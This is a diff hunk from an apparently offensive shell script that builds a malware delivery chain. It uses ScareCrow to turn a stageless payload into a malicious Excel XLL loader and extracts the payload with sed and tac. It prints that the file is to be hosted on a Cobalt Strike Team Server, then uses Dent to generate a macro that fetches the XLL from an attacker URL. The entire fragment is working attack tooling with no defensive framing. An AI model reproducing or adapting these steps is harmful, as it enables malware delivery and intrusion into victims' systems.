@@ -206,8 +206,7 @@ read url
        
        #create DENT payload
 	/tools/ScareCrow/ScareCrow -I $payload_dir/$payload64stageless -domain $domain -Loader excel -O $payload_dir/scarecrow-output.xll 
-	#sed '1,13d' $payload_dir/scarecrow-output.xll | tac | sed '1,26d' | tac | cut -d ""\" -f 2| tr -d "\n" > $payload_dir/https-scarecrow.xll #uncomment this line if using a freshly downloaded copy Scarecrow
-	sed -n 13,14p ./scarecrow-output.xll | cut -d "'" -f 2| tr -d '\n' > https-scarecrow.xll
+	sed '1,13d' $payload_dir/scarecrow-output.xll | tac | sed '1,26d' | tac | cut -d ""\" -f 2| tr -d "\n" > $payload_dir/https-scarecrow.xll #uncomment this line if using a freshly downloaded copy Scarecrow
 	echo "[+] Malicious XLL created at $payload_dir/https-scarecrow.xll. Host this file on Cobalt Strike Team Server"
 	/tools/Dent/Dent -N cisadent.xll -U $url/ -F https-scarecrow.xll
 	mv $payload_dir/output.txt $payload_dir/dent.macro
